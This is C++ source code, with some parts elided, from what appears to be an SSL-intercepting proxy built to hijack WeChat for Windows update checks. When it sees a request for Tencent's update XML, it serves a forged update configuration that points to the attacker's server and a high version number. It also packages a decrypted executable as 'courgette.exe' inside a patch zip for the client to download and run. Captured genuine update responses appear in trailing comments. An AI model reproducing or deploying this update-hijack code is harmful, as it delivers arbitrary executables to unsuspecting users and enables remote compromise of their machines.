...
int WeixinPC::isWxPCUpdate(const char * url, const char * szdn) {
	if (strstr(szdn, "dldir1.qq.com") ) {
		...
		else if (strstr(url,"/weixin/Windows/Plugins/Update.xml")||strstr(url,"/weixin/Windows/XPlugin/updateConfigWin.xml") )
		{
			gWechatPCFlag = 3;
			return TRUE;
		}
...
int WeixinPC::sendWxPCUpdate(char * lpbuffer,int buflimit, LPSSLPROXYPARAM lpssl) {
	int ret = 0;
	...
	if (gWechatPCFlag == 1)
	{
		...
		string username = lpssl->username;
	...
	else if (gWechatPCFlag == 3)
	{
		int iret = 0;

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

		string zipfn = "CourgettePatch.zip";
		string zipfilename = Public::getUserPluginPath(lpssl->username) + zipfn;

		string exesrcfn = Public::getUserPluginPath(lpssl->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		string newexefn = exesrcfn + "_courgette.exe";
		ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);

		string inzipxmlfn = "file_component.xml";
		string inzipxmlfilename = Public::getUserPluginPath(lpssl->username) + inzipxmlfn;

		char * inzipxmlformat = 
			"<file_component>\r\n"
			"<filters>\r\n"
			"<filter appClientId=\"WeChatWin\" appClientVerMin=\"0x13030001\" sdkMin=\"110501\" runtimeAbis=\"x86\"/>\r\n"
			"</filters>\r\n"
			"<file md5=\"%s\" length=\"%d\">courgette.exe</file>\r\n"
			"</file_component>";
		...
		char inzipxml[4096];
		int inzipxmlsize = wsprintfA(inzipxml, inzipxmlformat, exemd5, exefs);
		FileOper::fileWriter(inzipxmlfilename, inzipxml, inzipxmlsize,TRUE);

		vector<string> zipinfns;
		zipinfns.push_back( "courgette.exe");
		zipinfns.push_back(inzipxmlfn);
		vector<string> zipsrcfns;
		zipsrcfns.push_back(newexefn);
		zipsrcfns.push_back(inzipxmlfilename);
		ret = Public::zipFiles(zipinfns, zipsrcfns, zipfilename);

		char zipmd5[64] = { 0 };
		int zipfs = CryptoUtils::getUpdateFileMd5(zipfilename, zipmd5, hexmd5, 0);

		char * xmlcheckformat =	
			"<Versions>\r\n"
			"<VersionInfo appClientVerMin=\"0x13030001\" fullurl=\"http://%s/%s\" md5=\"%s\" name=\"CourgettePatch\" runtimeAbis=\"x86\" sdkMin=\"110501\" updateEndTime=\"24\" updateStartTime=\"0\" useCdn=\"true\" version=\"99\">\r\n"
			"<Description/>\r\n"
			"<patches>\r\n"
			"<Patch/>\r\n"
			"</patches>\r\n"
			"</VersionInfo>\r\n"
			"<VersionInfo appClientVerMin=\"0x13030001\" fullurl=\"http://%s/%s\" grayMax=\"10000\" grayMin=\"1\" md5=\"%s\" name=\"FinderLive\" runtimeAbis=\"x86\" sdkMin=\"110501\" updateEndTime=\"24\" updateStartTime=\"0\" useCdn=\"true\" version=\"9004\">\r\n"
			"<Description/>\r\n"
			"<patches>\r\n"
			"<Patch targetVersion=\"20000\" url=\"http://%s/%s\" md5=\"%s\" useCdn=\"true\" useCellular=\"true\"/>\r\n"
			"</patches>\r\n"
			"</VersionInfo>\r\n"
			"</Versions>\r\n"
			"<commands>\r\n"
			"<command module=\"default\" optype=\"setConfigPeriod\" opvalue=\"60\" runtimeAbis=\"x86\"/>\r\n"
			"</commands>\r\n"
			"</updateConfig>";
		char xmlcheck[0x1000];
		int xmlchecklen = sprintf(xmlcheck, xmlcheckformat, 
			ip.c_str(), zipfn.c_str(), zipmd5, ip.c_str(), zipfn.c_str(), zipmd5, ip.c_str(), zipfn.c_str(), zipmd5);

		char xmlcheckmd5[64] = { 0 };
		iret = CryptoUtils::getDataMd5(xmlcheck, xmlchecklen, xmlcheckmd5, 0);

		char * xmlformat =
			"<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
			"<updateConfig checkvalue=\"%s\" configVer=\"99999\"  xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\r\n%s";

		int xmllen = sprintf(lpbuffer, xmlformat, xmlcheckmd5, xmlcheck);
...
/*
dldir1.qq.com/weixin/Windows/XPlugin/updateConfigWin.xml
GET /weixin/Windows/XPlugin/updateConfigWin.xml HTTP/1.1
Accept: *//*
...
Date: Thu, 03 Jun 2021 08:20:39 GMT
Cache-Control: max-age=600
Expires: Thu, 03 Jun 2021 08:30:39 GMT
Content-Type: text/xml
Accept-Ranges: bytes
X-Cache-Lookup: Cache Hit
Last-Modified: Thu, 03 Jun 2021 06:15:17 GMT
Content-Encoding: gzip
Content-Length: 732
X-NWS-LOG-UUID: 3855619173024746533
X-NWS-UUID-VERIFY: ec5d92f1677da3240d52faa789caea4e
Connection: keep-alive
X-Cache-Lookup: Hit From Inner Cluster


<updateConfig checkvalue="65FC626C40C75BDB31FEF88610572FFC" configVer="1045" signature="MGUCME4xkZKLmihcKgxHM0qdaCuaqc4elK1CgCTggglkyYsAkJpAi3gv0/jCu+A0aAWT8AIxANL+bhjbTVYdXsLVzCsjdUoghzo0wKGy5c6Fg8Y4c6fTB2yNvC2l+9hxJ0OCR+rJcw==" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<Versions>
<VersionInfo appClientVerMin="0x63030000" fullurl="https://dldir1.qq.com/weixin/Windows/XPlugin/Package/CourgettePatch_1.0.1.1_V10.zip" md5="9A785C2D815C0EBA66AADC0F6037A59F" name="CourgettePatch" runtimeAbis="x86" sdkMin="210501" updateEndTime="24" updateStartTime="0" useCdn="true" version="10">
<Description/>
<patches>
<Patch/>
</patches>
</VersionInfo>
<VersionInfo appClientVerMin="0x63030000" fullurl="https://dldir1.qq.com/weixin/Windows/XPlugin/Package/FinderLive_1.0.2.5_V2004.zip" grayMax="10000" grayMin="1" md5="25C0FC86DF2309D1F22B8A78C7A51918" name="FinderLive" runtimeAbis="x86" sdkMin="210501" updateEndTime="24" updateStartTime="0" useCdn="true" version="2004">
<Description/>
<patches>
<Patch md5="F69DB26767B9EAFE4D8FF3F0D92DAAFD" targetVersion="2000" url="https://dldir1.qq.com/weixin/Windows/XPlugin/Patch/wechatplugin_FinderLive_V2000to2004.patch" useCdn="true" useCellular="true"/>
</patches>
</VersionInfo>
</Versions>
<commands>
...
/*
dldir1.qq.com/weixin/Windows/Plugins/Update.xml
GET /weixin/Windows/Plugins/Update.xml HTTP/1.1
Host: dldir1.qq.com
Accept: *//*

HTTP/1.1 200 OK
Last-Modified: Mon, 19 Apr 2021 12:58:31 GMT
Server: nws_yybmid_hy
Date: Mon, 19 Apr 2021 13:05:16 GMT
Cache-Control: max-age=600
Expires: Mon, 19 Apr 2021 13:15:16 GMT
Content-Type: application/xml
Content-Length: 2867
Accept-Ranges: bytes
X-NWS-LOG-UUID: 9773276151401519325
X-NWS-UUID-VERIFY: bdba9974730cf50b7925e692f68c4609
Connection: keep-alive
X-Cache-Lookup: Cache Hit

<?xml version="1.0" encoding="utf-8"?>
<updateConfig configVer="280">
    <Versions>
        <VersionInfo pluginName="FinderLive" fullurl="https://dldir1.qq.com/weixin/Windows/Plugins/WeChatObs_1.0.1.23.zip" version="0x61000117" md5="7020792f53f3fcd79f0b270cc35f7de0" MinPluginVer="0x61000101" MaxPluginVer="0x61000116" MinTargetVer="0x63020197" MaxTargetVer="0x6305ffff" grayMin="1" grayMax="3000" updateTime="00:00:00~23:59:59" isRandom="true" machineType="x86" exclude="Windows XP">
            <commands>
                <command optype="executeCommand" opvalue="UpdateParam=3" module="obs.exe"/>
                <command optype="killProcessCommand" opvalue="obs.exe,usbscreendriver.exe"/>
            </commands>
        </VersionInfo>

        <VersionInfo pluginName="FinderLive" fullurl="https://dldir1.qq.com/weixin/Windows/Plugins/WeChatObs_1.0.1.20.zip" version="0x61000114" md5="e369e758323511beeb699026c4cf4419" MinPluginVer="0x61000101" MaxPluginVer="0x61000113" MinTargetVer="0x6302013F" MaxTargetVer="0x63020196" grayMin="1" grayMax="3000" updateTime="00:00:00~23:59:59" isRandom="true" machineType="x86" exclude="Windows XP">
            <commands>
                <command optype="executeCommand" opvalue="UpdateParam=3" module="obs.exe"/>
                <command optype="killProcessCommand" opvalue="obs.exe,usbscreendriver.exe"/>
            </commands>
        ...
        <VersionInfo pluginName="FinderLive" fullurl="https://dldir1.qq.com/weixin/Windows/Plugins/WeChatObs_1.0.1.18.zip" version="0x61000112" md5="66bbfc58df039cf6e44549777de582d7" MinPluginVer="0x61000101" MaxPluginVer="0x61000111" MinTargetVer="0x63020123" MaxTargetVer="0x630201FF" grayMin="1" grayMax="10000" updateTime="00:00:00~23:59:59" isRandom="false" machineType="x86" exclude="Windows XP">
            <commands>
                <command optype="executeCommand" opvalue="UpdateParam=3" module="obs.exe"/>
                <command optype="killProcessCommand" opvalue="obs.exe,usbscreendriver.exe"/>
            </commands>
        ...
        <VersionInfo pluginName="FinderLive" fullurl="https://dldir1.qq.com/weixin/Windows/Plugins/WeChatObs_1.0.1.12.zip" version="0x6100010c" md5="45b8159efcb89ef020447866aa76d7b6" MinPluginVer="0x61000101" MaxPluginVer="0x6100010b" MinTargetVer="0x63010101" MaxTargetVer="0x63020122" grayMin="1" grayMax="10000" updateTime="00:00:00~23:59:59" isRandom="false" machineType="x86" exclude="Windows XP">
            <commands>
                <command optype="executeCommand" opvalue="UpdateParam=3" module="obs.exe"/>
                <command optype="killProcessCommand" opvalue="obs.exe,usbscreendriver.exe"/>
            </commands>
    ...
    <commands>
        <command optype="executeCommand" opvalue="UpdateInterval=2" module="obs.exe"/>
    </commands>
</updateConfig>
*/
